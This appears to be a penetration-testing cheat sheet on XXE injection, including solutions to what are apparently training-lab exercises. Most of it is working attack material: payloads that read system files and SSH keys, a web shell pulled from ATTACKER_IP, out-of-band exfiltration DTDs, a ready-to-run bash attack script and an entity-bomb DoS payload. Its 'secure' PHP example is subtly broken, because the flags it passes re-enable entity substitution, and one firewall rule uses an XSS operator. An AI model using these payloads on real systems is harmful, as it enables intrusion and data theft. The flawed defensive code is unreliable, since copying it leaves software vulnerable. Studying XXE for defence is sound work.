# XML External Entity (XXE) Injection

> **💀 Server-Side Attack:** Exploiting XML parsers to access local files, execute code, and perform SSRF attacks

## Overview

XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. XXE attacks occur when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

**XXE Attack Capabilities:**
- **Local File Disclosure** - Read sensitive server files
- **Remote Code Execution** - Execute system commands  
- **Server-Side Request Forgery (SSRF)** - Access internal networks
- **Denial of Service (DoS)** - Crash server with entity bombs
- **Source Code Disclosure** - Extract application source code

---

## 1. Local File Disclosure

### Identifying XXE Vulnerabilities

#### XML Input Detection
**Common XXE Targets:**
- Contact forms submitting XML data
- API endpoints accepting XML content
- File upload functionality processing XML/SVG
- SOAP web services
- RSS feeds and XML sitemaps

#### Testing Methodology

**Step 1: Identify XML Processing**
```http
POST /submitDetails.php HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>Test User</name>
    <email>test@example.com</email>
    <message>Test message</message>
</root>
```

**Step 2: Test Entity Processing**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
    <name>Test User</name>
    <email>&company;</email>
    <message>Test message</message>
</root>
```

**Vulnerability Indicators:**
- Entity value (`Inlane Freight`) appears in response
- Non-vulnerable apps show `&company;` as raw text
- XML parsing errors reveal parser type/version

### Basic File Disclosure Attacks

#### Reading System Files
**Target `/etc/passwd`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <name>Test User</name>
    <email>&file;</email>
    <message>Test message</message>
</root>
```

#### Common Target Files
```bash
# Linux sensitive files
/etc/passwd           # User accounts
/etc/shadow          # Password hashes (if readable)
/etc/hosts           # Network configuration
/root/.ssh/id_rsa    # SSH private keys
/var/log/apache2/access.log  # Web server logs

# Windows sensitive files  
C:\Windows\System32\drivers\etc\hosts
C:\Users\Administrator\.ssh\id_rsa
C:\inetpub\logs\LogFiles\W3SVC1\

# Application files
/var/www/html/config.php     # Database credentials
/opt/tomcat/conf/tomcat-users.xml  # Tomcat users
```

### Reading Source Code

#### PHP Source Code Disclosure
**Problem:** Direct file inclusion breaks XML format
```xml
<!-- This fails - PHP code breaks XML -->
<!ENTITY source SYSTEM "file:///var/www/html/index.php">
```

**Solution:** PHP Filter Wrapper
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY source SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
    <name>Test User</name>
    <email>&source;</email>
    <message>Test message</message>
</root>
```

**Decoding Base64 Output:**
```bash
# Extract base64 from response
echo "PD9waHAKZWNobyAiSGVsbG8gV29ybGQhIjsKPz4=" | base64 -d

# Output: <?php echo "Hello World!"; ?>
```

### Remote Code Execution

#### PHP Expect Wrapper (Rare)
**Requirements:** `expect` module installed and enabled
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY cmd SYSTEM "expect://id">
]>
<root>
    <name>Test User</name>
    <email>&cmd;</email>
    <message>Test message</message>
</root>
```

#### Web Shell Deployment
**Method 1: Download and Execute**
```bash
# Step 1: Create web shell
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

# Step 2: Start HTTP server
python3 -m http.server 80
```

**Step 3: XXE payload to download shell:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY shell SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
]>
<root>
    <name>Test User</name>
    <email>&shell;</email>
    <message>Test message</message>
</root>
```

**Note:** Replace spaces with `$IFS` to avoid breaking XML syntax

### Other XXE Attack Vectors

#### Server-Side Request Forgery (SSRF)
```xml
<!DOCTYPE email [
  <!ENTITY ssrf SYSTEM "http://internal-server:8080/admin">
]>
<root>
    <email>&ssrf;</email>
</root>
```

#### Denial of Service (Billion Laughs)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
]>
<root>
    <email>&a5;</email>
</root>
```

---

## 2. Advanced File Disclosure

### Advanced Exfiltration with CDATA

#### Problem with Special Characters
**Issue:** Files containing XML special characters break entity parsing
```
< > & " ' characters break XML format
Binary data cannot be included in XML
```

#### CDATA Solution
**Theory:** Wrap content in CDATA to treat as raw data
```xml
<![CDATA[ ANY_CONTENT_INCLUDING_SPECIAL_CHARS ]]>
```

#### Parameter Entity Bypass
**Problem:** Cannot join internal and external entities directly
```xml
<!-- This doesn't work -->
<!ENTITY joined "&begin;&file;&end;">
```

**Solution:** Use Parameter Entities (`%`)
```xml
<!-- This works with external DTD -->
<!ENTITY joined "%begin;%file;%end;">
```

#### Complete CDATA Attack

**Step 1: Create External DTD**
```bash
# Create xxe.dtd file
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

# Start HTTP server
python3 -m http.server 8000
```

**Step 2: XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
    <name>Test User</name>
    <email>&joined;</email>
    <message>Test message</message>
</root>
```

**Benefits:**
- Works with any file type
- No base64 encoding required
- Preserves original formatting
- Bypasses character restrictions

### Error-Based XXE

#### Scenario: Blind XXE Exploitation
**Problem:** Application doesn't display XML entity values
**Solution:** Force errors to leak file content

#### Error-Based Technique

**Step 1: Create Error-Inducing DTD**
```bash
# Create xxe.dtd
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF

# Start HTTP server
python3 -m http.server 8000
```

**Step 2: Trigger Error with File Content**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root>
    <name>Test User</name>
    <email>test@example.com</email>
    <message>Test message</message>
</root>
```

**Result:** Error message contains file content
```
Error: Invalid URI: 'nonExistingEntity/[FILE_CONTENT]'
```

---

## 3. Blind Data Exfiltration

### Out-of-band (OOB) Data Exfiltration

#### Scenario: Completely Blind XXE
**Problem:** No entity output displayed AND no error messages shown
**Solution:** Out-of-band data exfiltration via HTTP requests

#### OOB Attack Methodology

**Theory:** Instead of displaying file content in response, make application send HTTP request to attacker server with file content as URL parameter

#### Manual OOB Technique

**Step 1: Create Exfiltration DTD**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

**Step 2: Setup Decoding Server**
```php
<?php
// index.php - Auto-decode base64 file content
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**Step 3: Start PHP Server**
```bash
# Save above PHP code to index.php
echo '<?php if(isset($_GET["content"])){error_log("\n\n" . base64_decode($_GET["content"]));} ?>' > index.php

# Start server to receive exfiltrated data
php -S 0.0.0.0:8000
```

**Step 4: OOB XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Step 5: Create External DTD**
```bash
# Create xxe.dtd with exfiltration entities
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
EOF
```

**Result:** Server receives HTTP request with base64-encoded file content
```bash
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

### Alternative OOB Methods

#### DNS OOB Exfiltration
**Advanced Technique:** Use DNS subdomain queries to exfiltrate data
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://%file;.attacker.com/'>">
```

**Capture with tcpdump:**
```bash
# Monitor DNS queries for subdomain data
tcpdump -i any -n port 53 | grep attacker.com

# Extract and decode base64 subdomain
```

### Automated OOB Exfiltration

#### XXEinjector Tool
**Installation:**
```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector
```

#### Tool Usage

**Step 1: Prepare HTTP Request Template**
```http
POST /blind/submitDetails.php HTTP/1.1
Host: target.com
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Step 2: Execute XXEinjector**
```bash
# Automated OOB exfiltration
ruby XXEinjector.rb \
    --host=ATTACKER_IP \
    --httpport=8000 \
    --file=/tmp/xxe.req \
    --path=/etc/passwd \
    --oob=http \
    --phpfilter

# Output stored in Logs directory
cat Logs/target.com/etc/passwd.log
```

#### XXEinjector Advanced Options
```bash
# Different attack modes
--oob=http          # HTTP OOB exfiltration
--oob=gopher        # Gopher protocol
--oob=ftp          # FTP protocol

# Additional features
--phpfilter        # Use PHP filter wrapper
--cdata           # CDATA-based exfiltration  
--xml             # Basic XXE enumeration
--enumerate       # File/directory enumeration
```

### Complete OOB Attack Workflow

#### Step-by-Step Implementation
```bash
#!/bin/bash
# oob-xxe-attack.sh

TARGET="http://target.com/blind/submitDetails.php"
ATTACKER_IP="YOUR_IP"

echo "[+] Setting up OOB XXE attack"

# Step 1: Create decoding server
cat > index.php << 'EOF'
<?php
if(isset($_GET['content'])){
    $decoded = base64_decode($_GET['content']);
    echo "Exfiltrated data:\n";
    echo $decoded;
    error_log("XXE Data: " . $decoded);
}
?>
EOF

# Step 2: Create external DTD
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://$ATTACKER_IP:8000/?content=%file;'>">
EOF

# Step 3: Start server
echo "[+] Starting PHP server on port 8000"
php -S 0.0.0.0:8000 &
SERVER_PID=$!

# Step 4: Send XXE payload
echo "[+] Sending OOB XXE payload"
curl -X POST "$TARGET" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://'$ATTACKER_IP':8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>'

echo "[+] Check server logs for exfiltrated data"
wait $SERVER_PID
```

---

## HTB Academy Lab Solutions

### Lab 1: Connection.php API Key Extraction

**Target:** `http://10.129.234.170` (ACADEMY-WEBATTACKS-XXE)

**Objective:** Read `connection.php` and find `api_key` value

**Solution:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
    <name>Test User</name>
    <email>&file;</email>
    <message>Test message</message>
</root>
```

**Decode Base64 Response:**
```bash
# Extract base64 from HTTP response
echo "[BASE64_OUTPUT]" | base64 -d

# Look for api_key value in decoded PHP code
```

**🎯 Flag:** `UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg`

### Lab 2: Advanced Flag.php Extraction

**Target:** `http://10.129.234.170` (ACADEMY-WEBATTACKS-XXE)

**Objective:** Read `/flag.php` using CDATA or Error-based methods

#### Method 1: CDATA Approach (at `/index.php`)

**Step 1: Create External DTD**
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

**Step 2: XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
    <name>Test User</name>
    <email>&joined;</email>
    <message>Test message</message>
</root>
```

#### Method 2: Error-Based Approach (at `/error`)

**Step 1: Create Error DTD**
```bash
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF
python3 -m http.server 8000
```

**Step 2: Error XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root>
    <name>Test User</name>
    <email>test@example.com</email>
    <message>Test message</message>
</root>
```

**🎯 Flag:** `HTB{...}`

### Lab 3: Blind OOB Data Exfiltration

**Target:** `http://10.129.234.170` (ACADEMY-WEBATTACKS-XXE)

**Objective:** Use OOB exfiltration on `/blind` page to read `/327a6c4304ad5938eaf0efb6cc3e53dc.php`

#### Manual OOB Method

**Step 1: Setup Decoding Server**
```bash
# Create index.php for auto-decoding
echo '<?php if(isset($_GET["content"])){error_log("\n\n" . base64_decode($_GET["content"]));} ?>' > index.php

# Start PHP server
php -S 0.0.0.0:8000
```

**Step 2: Create External DTD**
```bash
# Create xxe.dtd for OOB exfiltration
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
EOF
```

**Step 3: OOB XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Step 4: Send to `/blind/submitDetails.php`**
```bash
curl -X POST "http://10.129.234.170/blind/submitDetails.php" \
    -H "Content-Type: application/xml" \
    -d 'PAYLOAD_ABOVE'
```

**Step 5: Check Server Logs**
- Server receives HTTP request with base64-encoded PHP file
- Example base64 response: `PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K`
- PHP auto-decodes and displays flag in error log

**Decode Base64 to Get Flag:**
```bash
echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d

# Output: <?php $flag = "HTB{...}"; ?>
```

#### Automated XXEinjector Method

**Step 1: Prepare Request File**
```bash
cat > xxe.req << EOF
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.234.170
Content-Type: text/plain;charset=UTF-8
Content-Length: 169

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
EOF
```

**Step 2: Execute XXEinjector**
```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

ruby XXEinjector.rb \
    --host=ATTACKER_IP \
    --httpport=8000 \
    --file=/tmp/xxe.req \
    --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php \
    --oob=http \
    --phpfilter

# Check results
cat Logs/10.129.234.170/327a6c4304ad5938eaf0efb6cc3e53dc.php.log
```

**🎯 Flag:** `HTB{...}`

---

## Automated XXE Testing

### XXE Detection Script
```bash
#!/bin/bash
# xxe-tester.sh

URL="$1"
if [ -z "$URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "Testing XXE on: $URL"

# Test 1: Basic entity processing
echo "=== Test 1: Basic Entity Processing ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY test "XXE_TEST">]><root><email>&test;</email></root>' \
    | grep -i "XXE_TEST" && echo "✓ Basic XXE detected"

# Test 2: File disclosure
echo "=== Test 2: File Disclosure ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY file SYSTEM "file:///etc/passwd">]><root><email>&file;</email></root>' \
    | grep -i "root:" && echo "✓ File disclosure XXE detected"

# Test 3: HTTP SSRF
echo "=== Test 3: SSRF Detection ==="
curl -s -X POST "$URL" \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY ssrf SYSTEM "http://httpbin.org/ip">]><root><email>&ssrf;</email></root>' \
    | grep -i "origin" && echo "✓ SSRF XXE detected"
```

### Burp Suite XXE Testing

#### Intruder Payloads
```xml
# File enumeration payloads
<!ENTITY file SYSTEM "file:///etc/passwd">
<!ENTITY file SYSTEM "file:///etc/hosts">
<!ENTITY file SYSTEM "file:///var/www/html/config.php">
<!ENTITY file SYSTEM "file:///root/.ssh/id_rsa">
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

#### Content-Type Bypass
```http
# Try different content types
Content-Type: application/xml
Content-Type: text/xml  
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
```

---

## Vulnerable Code Examples

### PHP - Insecure XML Processing
```php
<?php
// Vulnerable: Default XML parser settings
$xml_data = file_get_contents('php://input');

// Dangerous: External entities enabled by default
$doc = new DOMDocument();
$doc->loadXML($xml_data); // XXE vulnerability

// Process XML without validation
$email = $doc->getElementsByTagName('email')->item(0)->nodeValue;
echo "Check your email: " . $email;
?>
```

### Secure XML Processing
```php
<?php
// Secure: Disable external entities
$xml_data = file_get_contents('php://input');

// Safe XML parser configuration
$doc = new DOMDocument();

// Disable external entity loading
libxml_disable_entity_loader(true);

// Additional security measures
$doc->resolveExternals = false;
$doc->substituteEntities = false;

// Safe XML loading
if ($doc->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD)) {
    $email = $doc->getElementsByTagName('email')->item(0)->nodeValue;
    
    // Validate and sanitize output
    $email = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    echo "Check your email: " . $email;
} else {
    echo "Invalid XML format";
}
?>
```

---

## Prevention & Hardening

### XML Parser Configuration

#### PHP Security Settings
```php
// Disable external entity loading globally
libxml_disable_entity_loader(true);

// Safe DOMDocument usage
$doc = new DOMDocument();
$doc->resolveExternals = false;
$doc->substituteEntities = false;
```

#### Java Security Settings
```xml
<!-- Disable DTD processing -->
<property name="http://apache.org/xml/features/disallow-doctype-decl" value="true"/>

<!-- Disable external general entities -->
<property name="http://xml.org/sax/features/external-general-entities" value="false"/>

<!-- Disable external parameter entities -->
<property name="http://xml.org/sax/features/external-parameter-entities" value="false"/>
```

### Application-Level Controls

#### Input Validation
```php
// Validate XML input before processing
function validateXML($xml_string) {
    // Check for dangerous patterns
    $dangerous_patterns = [
        '/<!ENTITY/i',
        '/SYSTEM/i', 
        '/PUBLIC/i',
        '/file:\/\//i',
        '/http:\/\//i',
        '/ftp:\/\//i'
    ];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $xml_string)) {
            throw new Exception("Dangerous XML pattern detected");
        }
    }
    
    return true;
}
```

#### Content-Type Validation
```php
// Only accept expected content types
$allowed_types = ['application/xml', 'text/xml'];
$content_type = $_SERVER['CONTENT_TYPE'] ?? '';

if (!in_array($content_type, $allowed_types)) {
    http_response_code(400);
    die("Invalid content type");
}
```

---

## Detection & Monitoring

### Log Analysis
```bash
# Monitor for XXE attack patterns
grep -i "<!ENTITY" /var/log/apache2/access.log
grep -i "SYSTEM" /var/log/apache2/access.log
grep -i "file:///" /var/log/apache2/access.log

# Look for suspicious file access patterns
grep -E "(passwd|shadow|id_rsa)" /var/log/apache2/access.log
```

### Web Application Firewall Rules
```apache
# ModSecurity rules for XXE protection
SecRule REQUEST_BODY "@detectXSS" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'XXE Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# Block XML with external entities
SecRule REQUEST_BODY "@rx (?i)<!ENTITY.*SYSTEM" \
    "id:1002,\
    phase:2,\
    deny,\
    msg:'XML External Entity Attack'"
```

### Security Testing Checklist
- [ ] Test all XML input endpoints for entity processing
- [ ] Verify external entity loading is disabled
- [ ] Check for file disclosure vulnerabilities
- [ ] Test SSRF capabilities through XXE
- [ ] Validate parser error handling
- [ ] Monitor for DoS entity bomb attacks

---

*XXE injection vulnerabilities highlight the importance of secure XML parser configuration and input validation in web applications.* 